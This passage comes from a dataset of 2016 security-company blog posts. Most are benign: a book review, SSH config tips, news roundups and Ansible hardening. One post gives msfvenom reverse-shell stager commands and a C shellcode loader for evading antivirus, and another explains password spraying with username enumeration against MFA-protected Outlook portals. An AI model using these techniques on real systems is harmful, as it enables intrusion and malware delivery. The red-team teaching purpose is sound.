(http://www.theguardian.com/media/2016/jun/12/wikileaks-to-publish-more-hillary-clinton-emails-julian-assange). For the most part this is a political issue, and I wasn\u2019t considering it for this column, but then came how Mr. Assange supposedly acquired this data and made this a security matter. Shortly after Assange\u2019s announcement came news that Russian hackers had penetrated several DNC assets and were in possession of the opposition research on Donald Trump (http://www.politico.com/story/2016/06/russian-government-hackers-broke-into-dnc-servers-stole-trump-oppo-224315). Interesting, and I think it was here that people began to believe that Russia had perhaps given information (found on the same servers) that Assange claims could lead to the indictment of Hillary Clinton to WikiLeaks. A new player entered the game at this point, claiming to be a lone hacker \u201cGuccifer 2.0\u201d who claims they were the ones who broke into the DNC server and dropped a few documents as evidence (http://arstechnica.com/security/2016/06/lone-wolf-claims-responsibility-for-dnc-hack-dumps-purported-trump-smear-file/.) It\u2019s been about two days since I\u2019ve read anything further on the case. As noted above in the hype warning, remember that none of the information in the articles above is anything we should call \"actual\" evidence.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Book Review: \"Red Team - How to Succeed by Thinking Like the Enemy\"\"\nTaxonomies: \"Author, Brian King, InfoSec 101, Red Team, kitchen remodel, pen-testing, penetration testing, pentest, Pentesting, Red Team, red team your life, red teaming\"\nCreation Date: \"Mon, 20 Jun 2016 16:32:50 +0000\"\nBrian B. King //\n\nRed Teaming is one of those terms popping up all over the place lately, and it seems to mean different things to different people. Is it just an intense pentest with looser rules of engagement? Is it people on-site breaking in at night? Is it when you actually steal the asset, instead of taking a picture to prove you got to it?\n\nMicah Zenko, Senior Fellow at the Council on Foreign Relations, wrote Red Team: How to Succeed by Thinking Like the Enemy, that gives a wide-ranging treatment of the question. The way he describes \"Red Teaming,\" it isn't a specific set of techniques or rules, but a way of looking at things differently to help avoid unpleasant surprises.\n\nThe book starts off in antiquity with the \"Devil's Advocate,\" which was an actual position in the Catholic Church, whose responsibilities were to argue against a proposed elevation to sainthood. The title came from the idea that it was in the Devil's interest to limit the number of saints.\n\nThis position was in place until 1983. In the 20 years after it was removed, the Church approved more sainthoods and beatifications than in the prior 2000 years. \n\nThe \"Devil's Advocate\"was maybe the first red team position, and it had a clear effect: it restrained the organization and made sure that its decisions were supported by the available evidence. Whether it went too far is not the point. The point is that it was a respected, well-staffed, influential process that forced some critical thinking.\n\nThe book describes a red team approach as one that uses \"simulations, vulnerability probes, and alternate analyses,\" to \"reveal and test unstated assumptions, identify blind spots, and potentially improve\" outcomes and performance. The problem of \"how to determine when your practices are producing suboptimal outcomes leads to the central theme: you cannot grade your own homework.\" All of that is from the introduction.\n\nA red team approach calls on knowledgeable experts with the necessary information to evaluate ... anything. You can red team an organization's security controls. You can red team the decision to go to market with a new product. You can red team an intelligence assessment: based on the information we can gather, is this site a civil nuclear power station, a start to a weapons program, a ruse to force another country's hand? Something else entirely?\n\nRed teaming is most successful when those knowledgeable experts are not part of the core team. The team that came up with the plan-so-far cannot help but be blind to some of the embedded assumptions. The people on your red team should have the necessary domain knowledge, but not already be invested in the project's direction. They should be the kinds of people who can identify correlations or interactions that others overlook. They should be able to put themselves in the mindset of a motivated adversary, and should be familiar with what actual adversaries actually do. They should be able to step back and look with fresh, skilled eyes, and not be afraid to describe what they see.\n\nRed teaming is very close to penetration testing, but maybe encompasses a larger set of options and targets. The next time you're making a decision - at home or at work - think about a red team analysis.\n\nI'm considering an update to my kitchen. I'm shocked at the initial estimates, and more than a little hesitant to pull the trigger on such an outlay - not to mention the disruption to my home while it happens. My sister recently had her kitchen re-done. She has some fresh knowledge and experience that I don't, and she knows me well enough to know what\u2019s important to me. So, I'm asking my sister to red team my kitchen plans. Before I read this book, that would have sounded to me like a silly thing to say. But now, there's no way I'm going forward without it.\n\nBook: Red Team - How to Succeed by Thinking Like the Enemy\n\nAuthor: Micah Zenko\n\nLink: http://www.cfr.org/defense-and-security/red-team/p36481\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"SSH Config Files\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, Ethan Robish, Red Team, Red Team Tools, Linux, ssh config files, SSH configs\"\nCreation Date: \"Wed, 22 Jun 2016 14:26:24 +0000\"\nEthan Robish //\n\nHere's a short intro for anyone not familiar with ssh config files, which are usually located at ~/.ssh/config\n\nAs an example, you have ssh running on port 2222 on a system you refer to as \"linux\" with the username of \"root\". You might have an ssh config entry that looks like this:\n\nHost linux\n  HostName 192.168.1.100\n  Port 2222\n  User root\n\nIn this example, \"linux\" is simply any name you want to use when connecting to the remote system. It has nothing to do with the actual hostname or any other configuration of the remote system.\n\nThis lets you shorten your ssh command to:\n\nssh linux\n\ninstead of:\n\nssh -p 2222 root@192.168.1.100\n\nIt also works for scp like this:\n\nscp some_file linux:/root/some_file\n\nThis is just scratching the surface for what you can do but it is definitely made my life much more convenient.\n\nOther common directives I use are LocalForward, DynamicForward, and IdentityFile which correspond to the -L, -D, and -i ssh command line options respectively.\n\nThis was a quick introduction, but here is an excellent article that goes into more depth if you're interested in learning more.\n\nhttp://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/\n\nAnd of course, you can check the man page for ssh_config if you really want to geek out. Bonus Tip:\n\nHave you ever wanted to add a port forward to an existing SSH connection? Maybe you just decided to kill the connection and start it again with the additional command-line options.\n\nIf for some reason you can't restart your connection, fret not!  In OpenSSH, you can add a port forward by entering the correct EscapeChar and then starting an OpenSSH command line. By default, the escape character is tilde (~) and a capital C is used to enter a command. After that, you can specify a port forward just like you would if you called ssh from the command line. So instead of running this:\n\nssh linux -L 8000:127.0.0.1:8000\n\nYou could stay in your ssh session and use the ~C sequence instead.\n\nReference: https://coderwall.com/p/5wp2wg/start-port-forwarding-over-an-existing-ssh-connection-instead-of-creating-a-new-one\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 062416\"\nTaxonomies: \"News, GoToMyPC, iOS10, Linux Kernel, PyCon2016, UDP, unencrypted kernel\"\nCreation Date: \"Fri, 24 Jun 2016 18:46:44 +0000\"\n\nThis week is going to be sort of short. I get to go on vacation! I\u2019ll still be trying to do some minimal posts during the next two weeks, but I\u2019m mostly going to be concentrating on a book and a hammock, so forgive me if they\u2019re short. All in all, this week was pretty quiet for infosec related things. I\u2019ve add a few blurbs about projects I like that I felt like many people may not know about, as well as some things that are maybe tangentially related to security, but more about programming.\n\n\u201cSophisticated\u201d password attack. Citrix reset all of its passwords for gotomypc after claiming that there were password reuse attacks happening against client accounts. While this doesn\u2019t really qualify as sophisticated in my book I thought it interesting that a company that makes its money on providing remote access to computers isn\u2019t requiring two factor authentication. For those of you who do use gotomypc here\u2019s how to set up 2fa: http://support.citrixonline.com/en_US/gotomypc/all_files/gtc070021\n\nAnd here\u2019s the announcement as to why you should.\n\nhttp://status.gotomypc.com/incidents/s2k8h1xhzn4k\n\nPyCon 2016 had a talk that caught my attention. Every once in awhile I come accross the problem of wanting to transfer one simple file from one of my machines to another (usually a vps system in Digital Ocean) and don\u2019t want to mess with scp for one reason or another (to lazy to upload the key while also being too paranoid to turn on password auth) and for those moments I came up with this: https://github.com/lawrencehoffman/spit which is a simple python script to encrypt data across sprunge (a pastebin like service.) It\u2019s secure enough for most of my personal projects in that it uses AES. Then I saw this project called magic-wormhole. It\u2019s great! I haven\u2019t finished my personal security review yet, so I won\u2019t be using it for any official business until I have looked over the code and feel like I can be confident that correct measures are being taken with the crypto, but for personal stuff it seems good enough to me.\n\nhttps://github.com/warner/magic-wormhole\n\nLong story short, the dev preview came out for iOS 10 with an unencrypted kernel. Some people thought this was a mistake, to put it simply, there was no way this was a mistake. Now Apple has confirmed as much. After having removed vulnerable user data out of the kernel Apple has left the kernel unencrypted for a performance gain.\n\nhttps://techcrunch.com/2016/06/22/apple-unencrypted-kernel/\n\nSome work has been being done by Tom Herbert over at Facebook get Transports over UDP added to the Linux kernel. What is it? Transport over UDP (outlined here https://tools.ietf.org/html/draft-herbert-transports-over-udp-00) would allow developers to create network protocols encapsulated in UDP where the stack exists in user space. This is interesting because this very activity is historically frowned upon by the Linux kernel team. It is reasoned that rather than implementing new protocols over UDP one should prefer to improve the Linux kernel\u2019s current systems. Facebook\u2019s motivation here is that it takes too long to get a new protocol into the hands of many users, once in the kernel mainstream distributions of the kernel (like those included in Android) must enable the module, which often doesn\u2019t happen for years. Herbert claims that with TOU developers will be able to roll out a new feature which relies on a custom protocol stack in months rather than years.\n\nhttps://lwn.net/Articles/688529/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Juniper Two Factor VPN & Linux\"\nTaxonomies: \"Author, David Fletcher, External/Internal, Red Team, Juniper, SSL, SSL VPN concentrator, VPN\"\nCreation Date: \"Mon, 27 Jun 2016 19:37:08 +0000\"\nDavid Fletcher //\nOn a recent internal penetration test engagement, I was faced with using a Juniper VPN to access the target network. One small problem, Juniper does not formally support Linux operating systems. The Juniper Pulse and Pulse Secure clients are only available for Windows and OSX.\n\nSince I didn\u2019t have an OSX system I would have been forced to give up several tools that are extremely useful. I did a fair amount of searching and found several solutions to the problem. However, many were somewhat complex and had a time investment requirement that just didn\u2019t make sense for my temporary access requirement.\nIn the end, I found the following post the most useful for successfully connecting.\nhttps://alexeymoseyev.wordpress.com/2014/10/29/junos-pulse-vpn-client-on-linux-two-phase-auth-64bit-how-to-make-it-all-work/\nSince, I was only connecting to this device on a temporary basis I just bypassed the Grease Monkey script and used a simple substitution. The process is outlined below.\nOpenConnect\nFirst, install OpenConnect using your favorite package manager. In order to make this work, you have to be running OpenConnect v7.05 or later. Starting with v7.05, the OpenConnect client has the --jupiter switch included which provides \u201cexperimental\u201d connectivity to Juniper VPN devices. Documentation for this switch is available at the following URL:\nhttp://www.infradead.org/openconnect/juniper.html\nYou won\u2019t find this information or evidence of the switch in the man page or help for OpenConnect.\nCookie Manager\nNext, you\u2019ll need a cookie manager. To prepare for building your SSL Tunnel you\u2019ll need to log onto the VPN web interface. This will place the DSID session cookie into your browser cookie storage. Once it is there, we will grab the value and pass it to OpenConnect on the command line in order to complete authentication. For this purpose, I just used Cookies Manager+ which I keep installed for web application penetration test engagements.\nThe Full Process\nNow that all of the prerequisites have been met, we\u2019ll log into the Juniper Web Interface. Log in using your user account, pin, and token value. Your pin is set up when you first access the VPN web interface. The passcode seen below is your pin and current two factor token value concatenated in that order.\n \nAfter successfully authenticating to the web interface, your browser will have multiple cookies set for the Juniper site. Open your cookie manager to review them. One of these cookie values has the name DSID. This value is necessary to complete the authentication process. Copy the value into your clipboard.\n \nNext, open a root shell and execute the following command to establish an SSL VPN tunnel with the target VPN concentrator.\n \nAfter executing this command, you should see output similar to the following indicating the progress of the negotiation process.\n \nVoila\u2026successful tunnel negotiation with a Juniper SSL VPN concentrator and nearly zero overhead.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Letter from John\"\nTaxonomies: \"Author, InfoSec 101, John Strand, News, customers, infosec, leadership, Management, Patagonia, people over profit, vested interest\"\nCreation Date: \"Wed, 29 Jun 2016 16:54:52 +0000\"\nJohn Strand //\n\nLast week BHIS took a new direction as a company. (Warning, this blog is not technical. But it is important.)\nIn the past few years we've grown considerably. The vast majority of our work is received from previous satisfied customers, which is mainly because of the awesome job that our testers have done. \nEvery company likes to brag that their employees are their most important asset. I remember being at Accenture and one of the managing partners had the audacity to say something along these lines. How can this be true of a company with over 30,000 employees? It is just not possible. At some point a company has to start focusing on profits and unfortunately, the people in the company often become a distant priority. \nDon\u2019t believe me? Look at overtime. Many companies pay their employees a fixed salary and then basically force the them to work ridiculous overtime. To the upper level goes the spoils. The employees get to bask in the warm glow of knowing they have jobs.\nErica (my wife) and I didn\u2019t want to create a company like this, we wanted something different. We\u2019ve been spending a lot of time looking into B corp status and looking at how other companies like Patagonia run and we are learning ways to stay focused on our goal of keeping BHIS people (both employee and customer) instead of profit driven. Moving forward BHIS will be splitting profits equally with our employees who have been with us for a specified period of time.\nWhat does that mean for our customers? First, it means your tester has a vested interest in doing a great job - far beyond just a simple paycheck. Second, in order for each tester to have space to do their best work, we try to limit them to one primary gig at a time. I talk with a lot of other testers for other firms and they are consistently working on two or three and sometimes four tests at the same time. This is a recipe for a really crummy pentest, regardless of the brilliant skills of the tester. We may not be the cheapest, but I am confident in the quality of our work, and confident in your entire customer experience with us.\nSo why a blog post about this? Well, happy employees do great work. We want to have the best employees and do the best work possible for our customers. When I say our people and the quality of work we do is our key differentiator, I want it to mean something. It has in the past, and we are taking steps to ensure that it will in the future.\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 070116\"\nTaxonomies: \"News, backdoor, font fuzzing, NSA, random number generator, RSA\"\nCreation Date: \"Fri, 01 Jul 2016 15:20:16 +0000\"\nLawrence Hoffman //\n\nAs I previously mentioned I\u2019m on vacation this week and next. As I like to go for long cross-country drives I\u2019ve not had much time to keep up with the news. Just to be sure we don\u2019t break pace I\u2019m still trying to talk a little about the things I did get a chance to read.\n\nI love to see articles about fuzzing techniques. I found this article about windows font fuzzing an interesting read on my phone one night at a campground.\n\nhttp://googleprojectzero.blogspot.com/2016/06/a-year-of-windows-kernel-font-fuzzing-1_27.html\n\nWe\u2019ve heard the stories of NSA backdooring a random number generator which was subsequently used by RSA in at least one of their more popular packages. This is an article sent over to me by Sally @sallyvdv. I really enjoyed reading this paper, though some of the mathematics involved may put some people off.\n\nhttps://eprint.iacr.org/2016/644.pdf\n\nThere\u2019ll be another super short one next week, and then a return to full length reviews the week following.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Question: What Can I Learn from Password Spraying a 2FA Microsoft Web App Portal?\"\nTaxonomies: \"External/Internal, Red Team, 2 factor authentication, 2FA, fun fun fun, MFA, Microsoft, Microsoft Web App Portal, password spraying, passwords\"\nCreation Date: \"Tue, 05 Jul 2016 17:31:03 +0000\"\nCarrie Roberts //\n\nAnswer: Enough to make it worth it!\nPenetration testers love to perform password spraying attacks against publicly available email portals as described here in this great post by Beau Bullock. Recently I performed a password spray against an Outlook Web App portal that had multi-factor authentication enabled using Microsoft MFA. The login page looked the same but the server responses gave away some very interesting information.\n\nOutlook Web App Login\nAs I password sprayed this portal, which had two-factor authentication enabled, I was able to learn two important things:\n1) Whether a username was valid or invalid (aka Username Enumeration)\n2) Whether the password was correct for a given username (even though access was not granted)\nHere at BHIS, we have learned through experience that the server response time when given a valid username is much quicker than when given an invalid username (many thanks to Brian Ferhman for all the things we've learned because of his work). The screenshot below shows examples of response times for valid versus invalid usernames.\n\nUsername Enumeration\nWe use the Burp Intruder tool to do password spraying. You can view the response time by turning on the \"Response Completed\" column in the results table view.\n\nView Response Time with Burp Intruder\nCool! We just built a valid list of usernames which can come in handy later on in the test.\nThe next super cool thing we can learn is whether the password we guessed is correct for the user. Wait, what? You said two-factor was enabled! Read-on. . .\nMicrosoft Multi-Factor Authentication (MFA) requires users to acknowledge a phone call or a text message before granting access to the resource. After correct credentials are entered, the server waits for  the user to verify the attempt (by pressing \u201c#\u201d on the phone call they receive for example). This is awesome from a security perspective; however, Microsoft still gives away whether the password is correct in its server response to valid credentials. The response is only slightly different but it is enough, as shown below.\n\nResponse Contains \"auth.owa\" When Password is Correct\n\nLogin Response for Invalid Credentials\nHow cool is that? Now we have valid usernames and passwords to use elsewhere. If we have been successful, we have also caused an unsolicited text or phone call to some users so be careful!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Three Simple Disguises for Evading Antivirus\"\nTaxonomies: \"Red Team, 64-bit, anti-virus, AV, meterpreter, meterpreter vs. antivirus\"\nCreation Date: \"Thu, 07 Jul 2016 16:54:31 +0000\"\nLogan Lembke //\n\nAntivirus has been a key component in defending computer systems since the 1990s. Over the years, antivirus began to dominate the discussion of PC security with other means falling to the wayside. Brand names such as Symantec and McAfee have continually jockeyed for business, each claiming that they alone possess the miracle cure. \n\nDespite what you may hear, let me reassure you, antivirus is dead. Here\u2019s why:\n\nEvading Antivirus Is Dead Simple\n\nFirst off, detecting malicious code is hard. To date, no one has figured out how to answer the question: Is this piece of code going to ruin my day? However, we have figured out how to answer the question: Does this piece of code look like something that has ruined someone else\u2019s day? \n\nIf we want to avoid detection, all we have to do is put a moustache and monocle on our code before we ship it on its way. \n\nThey\u2019ll Never See Me Coming\n\nDisguising malicious code can be accomplished using a few techniques, but before we take a look at what makes for a good disguise, let\u2019s discuss what malicious code tends to look like. \n\nThe Lay Person\u2019s Interpretation of Meterpreter\n\nAccording to Offensive Security, \u201cMeterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.\u201d\n\nPut more simply, \u201cMeterpreter is a piece of code that can load more code as it runs. It can use different methods to communicate back to its server, and the client can be extended by other programmers.\u201d As such, Meterpreter is often used by attackers to control a target\u2019s machine, and since the program is easily extended, Meterpreter can launch a slew of attacks ranging from key loggers to privilege escalation.\n\nMeterpreter Vs. Antivirus. FIGHT! \n\nWhile antivirus can detect Meterpreter, the architecture behind the program makes it exceedingly difficult to catch. \n\nOften times, Meterpreter will be launched by a \u201cstager.\u201d The stager\u2019s job is to establish communications between the target\u2019s computer and the attacker\u2019s server. Additionally, it needs to begin loading the rest of the Meterpreter client. Thanks to this piece-by-piece architecture, only the stager needs to be deployed on the target\u2019s computer before the program can be run. Since the rest of Meterpreter can be launched from memory, only the stager needs to sneak its way past AV.\n\nShellcode\n\nA Meterpreter stager can be deployed on a target\u2019s computer using a few techniques. At the heart of each technique lies \u201cshellcode.\u201d In reference to a Meterpreter stager, the shellcode is the machine code which actually accomplishes the stager\u2019s goals: setting up communications and launching the rest of Meterpreter. \n\nShell code has been used throughout several blog posts which have been previously published on our site.\n\nIn Brian\u2019s excellent post \u201cHow to Bypass Application Whitelisting & AV,\u201d he uses the following command to generate shellcode which can be executed in the C# programming language:\n\n\u201cmsfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=443 -f csharp > shellcode.txt\u201d\n\nThis command writes the following mess out to a file named shellcode.txt.\n\nWat.\n\nWhat we\u2019re looking at is a list of hexadecimal numbers which correspond to the machine code needed to create a Meterpreter stager. Specifically, this stager connects back to an attacker\u2019s machine on TCP port 443 and begins loading the rest of the Meterpreter client. \n\nIdentifying this shellcode is one way antivirus products may go about identifying malicious look-alike programs.\n\nTemplating\n\nWhile everyone loves to talk about shellcode, there is more that goes into creating a Meterpreter stager. The shellcode must be executed by something. Old school exploits work by loading the shellcode into a vulnerable program and forcing the program to execute it. In the case of phishing, shellcode can be embedded within VBA macros and ran inside Microsoft Word, Excel, and PowerPoint documents. (Check out Sally\u2019s awesome post for evading AV in PowerPoint here.) \n\nIn the simplest case, the shellcode is placed inside of a premade template and executed by itself. By default, MSFVenom (the most common program used to generate Meterpreter stagers) supplies its own templates. However, as Joff has previously explained here, these templates can be altered!\n\nWhy would we want to alter the template? Simply put, most AV products check the template used to execute the shellcode rather than the shellcode itself.\n\nNow to Just Give Them Fake Moustaches!\n\nDisguises\n\nSo far, we have identified the Meterpreter stager, and we have seen that it is made up of both shellcode and a template. Now, let\u2019s look at the different disguises available for hiding our stager. We can change the architecture of the whole stager, modify the template around the shellcode, or change the shellcode itself. Each change adds something new to the disguise. Some changes will vastly alter our executable, others will only slightly affect the results. We will compare the usefulness of each technique later on in the post.\n\n64 Bits of Magic\n\nCurrently, the Steam Hardware Survey indicates that over 85% of their users are running 64-bit operating systems. While this may not be representative of the business sector, it is clear evidence that 64-bit operating systems are becoming more common.\n\nWhen targeting a 64-bit operating system, we have the choice of deploying either a 32-bit or 64-bit stager. While the 32-bit stager will work on any modern Windows installation, the 64-bit stager is much more evasive. There is nothing inherently sneaky about using 64-bit stagers, but it seems as if there have been fewer signatures written for the 64-bit variants of the most common Meterpreter stagers.\n\nTemplate Trickery\n\nMSFVenom provides two default templates for Windows executables: one for 32-bit shellcode and another for 64-bit shellcode. These templates are essentially empty .exe files and are well known to antivirus engines. \n\nWindows EXE files following the PE/COFF format are made up of several different sections, each with different permissions. These permissions restrict the ability to read, write, or execute data at run time. For example, the section which contains the code to be executed (.text) is generally not writeable at run time. \n\nWhen creating a Meterpreter stager, MSFVenom will look at the default executable (.text) section of the template being used, and if there is enough space, insert the shellcode into it. Otherwise, MSFVenom will create a new section in the .exe file, mark it as executable, place the shellcode there, and modify the executable to start from the new section.   \n\nHowever, rather than using MSFVenom\u2019s default templates, we may choose to provide our own EXE file for the program to modify. Common choices for this technique are the executables included with every Windows installation such as write.exe and notepad.exe. By default, the template executables will no longer function as normal unless MSFVenom is explicitly told to start the stager in a new thread.\n\nRolling Your Own Template \n\nBeyond altering existing executables, we may choose to write our own templates. In this approach, we use MSFVenom to generate shellcode for use in a programming language of our choice. (In the following example, I chose the C programming language). Then, we insert the shellcode into our homemade template, and tell the computer to execute the code. \n\nStep-by-Step Instructions:\n\nFirst, run \u201cmsfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f c > shell_code.c 2>&1\u201d\n\nYour shell_code.c file should look similar to this:\n\nNext, open up Microsoft Visual Studio. If you don\u2019t have access to Visual Studio, a free copy can be obtained from here by choosing the community edition. \n\nNow, create a new C/C++ empty project and add the following code to a new file.\n\n#include \n#include //VirtualAlloc is defined here\nunsigned const char payload[] = \"\"; //shellcode as output by msfvenom\nsize_t size = 0; //size of payload in bytes (output by msfvenom)\nint main(int argc, char **argv) {\nchar *code;                     //Holds a memory address\ncode = (char *)VirtualAlloc(    //Allocate a chunk of memory and store the starting address\n        NULL, size, MEM_COMMIT,     \n        PAGE_EXECUTE_READWRITE  //Set the memory to be writable and executable\n    );\nmemcpy(code, payload, size);    //Copy our payload into the executable section of memory\n((void(*)())code)();            //Cast the executable memory to a function pointer and run it \nreturn(0);\n}\n\nNow, set the payload string equal to the contents of buf from the shellcode file, and set the size variable equal to the payload size.\n\nFinally, click build in Visual Studio. \n\nIf you wish to compile for 64-bit architectures, you must generate 64-bit shellcode with MSFVenom, and set the compilation architecture to 64-bit within Visual Studio.\n\nShellcode Encoders\n\nBeyond changing the stager\u2019s architecture and template, we can also attempt to disguise the shellcode itself. MSFVenom has the ability to obfuscate the stager\u2019s shellcode with a reversible cipher using its encoders system. This system was originally created in order to handle unsafe characters within the shellcode being processed. However, when researching AV evasion techniques, encoders seem to be a common suggestion. While their efficacy is debatable, two encoders are in heavy use: Shikata Ga Nai for 32-bit shellcode, and XOR encoding for 64-bit shellcode.\n\nWhat a Handsome Bunch\n\nPutting It All Together\n\nNow that we have selected our disguises, we need to put them to the test. First, we need to choose which shellcodes we want to disguise. Three of the most common shellcodes for Meterpreter stagers are reverse_tcp, reverse_http, and reverse_https. Next, we need to identify how many different disguises we want to test. We could choose 32-bit or 64-bit, to use the default template or a custom template, or to encode the shellcode or not. All in all, this leads to twenty-four different stagers to test.\n\nAfter generating all twenty-four stagers and making sure they worked, I ran them through Virus Total and plotted the results.\n\nAs you can see, moving to a custom template is the most effective disguise. However, simply changing the targeted architecture to 64-bit thwarts more than half of the tested AV engines. When combining the two disguises, our malware slips by every single engine tested. \n\nIn the case of 32-bit stagers, only a single antivirus engine was able to detect our malware wearing all three disguises: Qihoo 360. Even then, it was only identified via heuristic as general malware.\n\nAV evasion goes beyond the techniques discussed in this post. For example, you can alter the shellcode before it is assembled to machine code, you can use different programming languages to create your template, and you can use the full breadth of the Veil evasion suite. Antivirus is still a helpful tool in a blue teamer\u2019s belt, but beware antivirus is all but dead for any advanced persistent threat.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Securing Your Way to Restful Sleep with Ansible Galaxy\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, Jordan Drysdale, ansible, Ansible Galaxy, Linux\"\nCreation Date: \"Mon, 11 Jul 2016 19:03:43 +0000\"\nJordan Drysdale //\n \n\nLife as a 'blue-teamer' can often be a stressful experience. Working in an environment with a strong Linux infrastructure  can help some, but Ansible  can help immensely. In all environments, regardless of the operating systems at hand, we need to secure  remote access to our systems. The Ansible Galaxy is full of fun roles that make a blue-teamer\u2019s life easier.  Through Ansible Galaxy, we can utilize a few roles to secure a linux server quickly, effectively, and in a manner  that is easy to reproduce.\n\nWhen securing remote access, key-based SSH and sometimes 2FA can provide an extra layer of relief. Additionally, it would be hard to imagine dropping one's defenses and going naked, so a firewall is a standard requirement. Why not throw in fail2ban to defend against attempts to smash through open services with iptables? I seriously love this combination of services. :) \"Oh, you tried thrice to authenticate on our HTTPS? Fail2ban, please jail this IP for a while. Thanks, mkay.\" And, last but not least, let's dump all this stuff into logstash, Geo-IP map it in Kibana for an awesome visualization, and finally, get some rest.\n\nFirst, let's check our ansible version:\n\nansible@tw17ch01:/etc/ansible/roles/sshd$ dpkg -l |grep ansible\nii  ansible   2.1.0.0-1ppa~trusty        all        \nA radically simple IT automation platform\n\nNext, let's install, configure and deploy SSHd with a galaxy role that includes every possible variable. We are going to add the role, make some changes, and then later, we will build a playbook to deploy our new role. Link here - https://galaxy.ansible.com/mattwillsher/sshd/\n\nAnsible server magic:\n\nansible@tw17ch01:/etc/ansible/playbooks$ sudo ansible-galaxy \ninstall mattwillsher.sshd\n\n[sudo]\n\n password for ansible:\n- downloading role 'sshd', owned by mattwillsher\n- downloading role from https://github.com/willshersystems/\nansible-sshd/archive/v0.4.4.tar.gz\n- extracting mattwillsher.sshd to /etc/ansible/roles/\nmattwillsher.sshd\n- mattwillsher.sshd was installed successfully\n\nansible@tw17ch01:/etc/ansible/playbooks$ sudo mv mattwillsher.sshd/sshd/\n### Galaxy roles, for the most part, create a standard structure inside their \"role directory\" and if it doesn't exist,\n\nansible@tw17ch01:/etc/ansible/roles/sshd$ ls\nCHANGELOG  files  LICENSE  README.md  templates  Vagrantfile\ndefaults   handlers  meta  tasks  tests  vars\n\nansible@tw17ch01:/etc/ansible/roles$ sudo nano sshd/vars/Ubuntu_14.yml\n\n*Strong recommendation to modify the default port, disable root login altogether and add a line for PasswordAuthentication no. Ensure the file you modify is appropriate for the OS you are deploying the role to.\n\nNext, let's install, configure and deploy a firewall to block all the things. Link here - https://galaxy.ansible.com/geerlingguy/firewall/\n\nansible@tw17ch01:/etc/ansible/roles$ sudo ansible-galaxy install \ngeerlingguy.firewall\n\n[sudo]\n\n password for ansible:\n- downloading role 'firewall', owned by geerlingguy\n- downloading role from https://github.com/geerlingguy/ansible-role-firewall/archive/1.0.9.tar.gz\n- extracting geerlingguy.firewall to /etc/ansible/roles/geerlingguy.firewall\n- geerlingguy.firewall was installed successfully\n\nansible@tw17ch01:/etc/ansible/roles$ sudo mv geerlingguy.firewall/ chains/\n### Let's make a few edits.\nansible@tw17ch01:/etc/ansible/roles$ sudo nano chains/defaults/main.yml\n\nThe firewall mods were easier to wrap my brain around than the complexity built in to the sshd role. My system only needed the above listed SSH port and HTTPS. One more mod to the chains role:\n\nansible@tw17ch01:/etc/ansible/roles$ sudo nano chains/templates/firewall.bash.j2\n\nI added the following rule because I don't care about outbound traffic from a DO droplet right now.\n\n#  Allow all outbound traffic - \n# you can/SHOULD modify this to only allow certain traffic!\n\niptables -A OUTPUT -j ACCEPT\n\nThe chains role should be ready to rock.\n\nNext, let's install, configure and deploy fail2ban to protect services. Link here - https://galaxy.ansible.com/tersmitten/fail2ban/\n\nansible@tw17ch01:/etc/ansible/roles$ sudo ansible-galaxy install tersmitten.fail2ban\n- downloading role 'fail2ban', owned by tersmitten\n- downloading role from https://github.com/Oefenweb/ansible-fail2ban/archive/v1.5.0.tar.gz\n- extracting tersmitten.fail2ban to /etc/ansible/roles/tersmitten.fail2ban\n- tersmitten.fail2ban was installed successfully\n\nansible@tw17ch01:/etc/ansible/roles$ sudo mv tersmitten.fail2ban/ banner/\n### Let's make a few edits\nansible@tw17ch01:/etc/ansible/roles$ sudo nano banner/defaults/main.yml\n\nI had to make some changes to my sshd services configuration to reflect the use of a non-standard port. I also added service configuration for HTTPS. After looking through the rest of the directory structure, this role is also ready to go.\n\nLast, let's install, configure and deploy filebeat to ship log files to a useful destination. Link here - https://galaxy.ansible.com/jpnewman/elk-filebeat/\n\nansible@tw17ch01:/etc/ansible/roles$ sudo ansible-galaxy install jpnewman.elk-filebeat\n- downloading role 'elk-filebeat', owned by jpnewman\n- downloading role from https://github.com/jpnewman/ansible-role-elk-filebeat/archive/master.tar.gz\n- extracting jpnewman.elk-filebeat to /etc/ansible/roles/jpnewman.elk-filebeat\n- jpnewman.elk-filebeat was installed successfully\n\nansible@tw17ch01:/etc/ansible/roles$ sudo mv jpnewman.elk-filebeat/ logger/\n\nFinally, let's set up TLS shipment of logs across the interwebs for future prospecting inside an existing ELK stack. This assumes a bunch of things have already been done:\n\n1. Fully operational ELK stack\n\n2. TLS/PKI infrastructure in place for logstash and the certificate available for deployment via logger role\n\n3. Port forwarding on network firewall for logstash port\n\n4. Optional redis cluster to handle a large volume of log processing\n\nansible@tw17ch01:/etc/ansible/roles$ sudo nano logger/defaults/main.yml\n\nIn here, I have modified the elastic and logstash hosts to point to an infrastructure destination. Remember the pretty standard directory structure we discussed earlier? Yeah, copy your logstash-forward.crt file in to ../roles/logger/files/certs/ and the playbook intelligence will deliver. Here we are again, good to go. Let's roll and take a look at a few things to make sure it all works.\n\nansible@tw17ch01:/etc/ansible/roles$ ls\nbanner  chains  logger  sshd   ### roles all exist\n\ngt; vi ../ansible/hosts #add new host to your ansible hosts file\n\ngt; ansible dropper ping -m 12.34.56.78 | SUCCESS => {         \"changed\": false,         \"ping\": \"pong\" } ansible@tw17ch01:/etc/ansible/roles$ sudo nano ../playbooks/NewDrop.yml ### roles are awesome. invest the time. - hosts: all   become: yes   roles:           # deploy standard SSH config         - { role: sshd }           # install iptables         - { role: chains }           # add filebeat         - { role: 